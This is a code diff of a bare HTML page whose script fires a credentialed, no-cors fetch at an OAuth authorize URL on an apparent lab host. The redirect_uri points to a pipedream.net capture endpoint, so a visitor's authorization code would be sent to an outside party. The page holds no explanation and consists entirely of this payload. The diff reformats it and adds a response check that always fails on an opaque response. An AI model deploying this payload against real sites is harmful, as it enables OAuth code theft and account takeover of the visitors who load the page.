@@ -1,8 +1,21 @@
 <html>
   <body>
     <script>
-      const authUrl = "http://authorization-ptl-929f8477-75deddee.libcurl.so/oauth/authorize?client_id=307d3a09e67810763663307aa7f8d03679ca7d3c3141d9bf4a760ff9bf8c24e3&redirect_uri=https%3A%2F%2Feohouu0f2cks7br.m.pipedream.net&response_type=code"
-      fetch(authUrl, { method: 'HEAD', credentials: 'include', mode: 'no-cors'}).catch( err => {throw err;}).then(() => {});
+      const authUrl = "http://authorization-ptl-929f8477-75deddee.libcurl.so/oauth/authorize?client_id=307d3a09e67810763663307aa7f8d03679ca7d3c3141d9bf4a760ff9bf8c24e3&redirect_uri=https%3A%2F%2Feohouu0f2cks7br.m.pipedream.net&response_type=code";
+fetch(authUrl, { 
+    method: 'HEAD', 
+    credentials: 'include', 
+    mode: 'no-cors'
+})
+.then(response => {
+    if (!response.ok) {
+        throw new Error('Network response was not ok');
+    }
+})
+.catch(err => {
+    console.error('Fetch Error:', err);
+});
+
     </script>
   </body>
 </html>
